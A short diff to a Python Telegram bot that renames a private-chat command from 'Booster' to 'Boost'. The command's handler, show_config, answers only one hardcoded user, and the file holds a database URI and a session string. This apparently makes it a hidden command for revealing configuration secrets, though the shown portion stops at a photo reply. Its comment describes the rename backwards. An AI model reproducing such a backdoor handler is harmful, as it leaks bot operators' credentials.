@@ -15,7 +15,7 @@ MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
 
 # Yahan par 'boost' ko 'Booster' se replace kiya gaya hai
-@app.on_message(filters.command("Booster") & filters.private & filters.user(Booster))
+@app.on_message(filters.command("Boost") & filters.private & filters.user(Booster))
 async def show_config(client: Client, message: Message):
     await message.reply_photo(
         photo="https://h.uguu.se/JNSaqcVS.jpg",
